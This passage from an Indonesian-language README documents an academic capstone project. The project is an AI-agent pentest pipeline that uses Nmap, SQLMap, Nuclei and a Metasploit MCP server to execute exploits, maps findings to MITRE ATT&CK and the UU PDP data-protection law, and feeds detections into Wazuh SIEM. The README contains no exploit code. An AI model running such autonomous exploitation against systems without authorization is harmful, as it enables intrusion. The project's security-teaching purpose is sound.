| **Discord** | Manual/webhook | Embed message + file | Manual |

---

## 🚀 Setup & Cara Pakai

### Prasyarat

```bash
# 1. Python 3.10+
python3 --version

# 2. Virtual environment
python3 -m venv .venv
source .venv/bin/activate

# 3. Install dependencies
pip install langchain langchain-chroma langchain-community huggingface-hub
pip install requests urllib3 python-dotenv pyyaml

# 4. Security tools (pastikan terinstall)
# nmap, nuclei, ffuf, sqlmap, dalfox, whatweb, subfinder
sudo apt install nmap whatweb  # contoh
```

### Quick Start

```bash
# 1. Index UU PDP ke database (cuma sekali)
python index_uu_pdp.py

# 2. Setup kredensial gray box
python run_graybox.py --setup

# 3. Jalanin pentest full
python run_graybox.py

# 4. Baca hasil
cat graybox-*-report.md
```

### CLI Reference Lengkap

| Perintah | Fungsi |
|----------|--------|
| `python run_graybox.py` | Jalanin pentest dengan kredensial tersimpan |
| `python run_graybox.py --setup` | Setup kredensial interaktif |
| `python run_graybox.py --status` | Cek status kredensial |
| `python run_graybox.py --target URL --token TOKEN` | Run cepat tanpa setup |
| `python run_graybox.py --proxy http://127.0.0.1:8080` | Run via Burp Suite |
| `python index_uu_pdp.py` | Re-index UU PDP ke ChromaDB |
| `python agent_orchestrator.py` | Jalanin orchestrator langsung |
| `python scripts/mcp_metasploit.py` | Start Metasploit MCP server |

---

## 📦 Deliverables

### Output yang Dihasilkan

| File | Format | Isi |
|------|--------|-----|
| `graybox-<id>-report.md` | Markdown | Laporan pentest lengkap (MITRE + UU PDP) |
| `graybox-<id>-report.pdf` | PDF | Laporan siap cetak (WeasyPrint) |
| `graybox-<id>-navigator.json` | JSON | ATT&CK Navigator layer (heatmap visual) |
| `graybox-<id>-chain.json` | JSON | Chain report (teknik, taktik, pasal) |
| `Remediation_Roadmap.md` | Markdown | Roadmap perbaikan |

### ATT&CK Navigator

Output `navigator.json` bisa di-load di [MITRE ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/):

- 🔴 **Red:** Initial Access
- 🟡 **Yellow:** Discovery
- 🟣 **Magenta:** Credential Access
- 🟠 **Orange:** Privilege Escalation
- 🔵 **Cyan:** Collection
- 🔷 **Blue:** Exfiltration
- 🟤 **Purple:** Impact

---

## 🔄 Integrasi Sinergis (Project 4)

### 4 Modul Terintegrasi

```
┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│  📊 MODUL A  │    │  🕵️ MODUL B  │    │  🧠 MODUL C  │    │  💣 MODUL D  │
│  SIEM/Wazuh  │◀──▶│  Threat      │◀──▶│  AI Agent    │◀──▶│  Metasploit  │
│              │    │  Hunting     │    │  Pentest     │    │  MCP Server  │
└──────┬───────┘    └──────┬───────┘    └──────┬───────┘    └──────┬───────┘
       │                   │                   │                   │
       ▼                   ▼                   ▼                   ▼
  Deteksi serangan     Investigasi IOC      Generate Sigma      Payload & Exploit
  dari AI Agent        dari AI Agent        Rules + MITRE       Execution + Post-Exp
  ➜ Alert SIEM         ➜ Threat Intel       ➜ Detection Rules   ➜ Session Mgmt
```

### Alur Sinergi

1. **AI Agent (Modul C)** jalanin pentest ➜ generate temuan + MITRE mapping
2. **Metasploit MCP (Modul D)** eksekusi exploit untuk CVE yang cocok
3. **Wazuh SIEM (Modul A)** deteksi serangan dari AI Agent via Sigma Rules
4. **Threat Hunting (Modul B)** pakai IOC dari AI Agent buat investigasi
5. **Feedback loop:** SIEM detect ➜ validasi temuan ➜ update AI rules

---

## 📋 Rubrik Penilaian (Project 4)

| Kriteria (Bobot) | Implementasi | Bukti |
|-----------------|-------------|-------|
| **Integrasi Sistem (25%)** | AI Agent ↔ Wazuh SIEM ↔ Threat Hunting ↔ Metasploit MCP | Sigma Rules, IOC feed, alert correlation, payload generation |
| **Ketajaman Teknis (25%)** | MITRE ATT&CK v19.1 (75 tech), 30+ tools, Metasploit integration | Navigator layer, chain report, PoC, exploit execution |
| **Analisis Hukum PDP (20%)** | 48/48 UU PDP articles, RAG-based (340 chunks) | Legal mapping matrix, sanctions reference, pasal citations |
| **Otomasi & Efisiensi (15%)** | Full 8-phase pipeline, one-command execution, credential manager | `run_graybox.py`, anti-looping PTG, auto-report |
| **Presentasi (15%)** | Dokumentasi lengkap, README, reports, slide-ready | README.md, DOKUMENTASI_SISTEM_v2.md |

---

## 👥 Tim Pengembang

| Nama | Role | Kontribusi |
|------|------|-----------|
| **Vedara Alwi** | AI Agent Engineer | Hermes Agent integration, MITRE Mapper (75 techniques), MCP server architecture, Tools Bridge (120+ tools), WhatsApp/Telegram platform connectors, VPN automation, PTG anti-looping system |
| _Anggota Kelompok 7_ | Security Team | Pentest execution, report generation, PDP compliance audit, infrastructure setup |

### Tech Stack

| Layer | Technology |
|-------|-----------|
| **AI Agent** | Hermes Agent (OpenSource) + OpenCode Go |
| **LLM** | DeepSeek v4 (Pro + Flash) |
| **MCP Servers** | pentest-tools (65t), security-tools (200+t), burp-api, android-tools |
| **Security Tools** | Nmap, Nuclei, Metasploit, SQLMap, FFUF, Dalfox, Burp Suite, Wireshark |
| **Backend** | Python 3.10+, FastAPI, ChromaDB, SQLite |
| **Platform** | WhatsApp Bridge, Telegram Bot, Discord Webhook, CLI |
| **Infra** | Docker, SSTP VPN, JumpServer (Bastion), Wazuh SIEM |

---

## 📚 Referensi

### Framework & Standards
- [MITRE ATT&CK Enterprise v19.1](https://attack.mitre.org/) — Threat intelligence framework
- [MITRE ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/) — Visual technique mapping
- [OWASP API Security Top 10](https://owasp.org/API-Security/) — API vulnerability reference
- [CWE Database](https://cwe.mitre.org/) — Common Weakness Enumeration

### Legal
- **UU No. 27 Tahun 2022** — Perlindungan Data Pribadi (PDP)
- PP No. 71 Tahun 2019 — Penyelenggaraan Sistem Elektronik

### Tools
- [Nmap](https://nmap.org/) — Network scanner
- [Nuclei](https://nuclei.projectdiscovery.io/) — Vulnerability scanner (1000+ CVE templates)
- [FFUF](https://github.com/ffuf/ffuf) — Web fuzzer
- [SQLMap](https://sqlmap.org/) — SQL injection automation
- [Dalfox](https://github.com/hahwul/dalfox) — XSS scanner
- [Metasploit Framework](https://www.metasploit.com/) — Exploitation framework
- [ChromaDB](https://www.trychroma.com/) — Vector database for RAG

---

## 📄 Lisensi

Project ini dibuat untuk keperluan **akademik** — Capstone Project Cybersecurity 2026, Program Profesi Keamanan Siber.

**Peringatan:** Tools ini dirancang untuk pengujian keamanan yang etis dan legal. Hanya gunakan pada sistem yang lo miliki atau memiliki izin tertulis untuk diuji.

---

**Project Status:** 🟢 *Production Ready — Full 8-Phase Automated Pipeline (30+ Tools, 15 MITRE Tactics, 48 UU PDP Articles)*
**Last Updated:** May 31, 2026
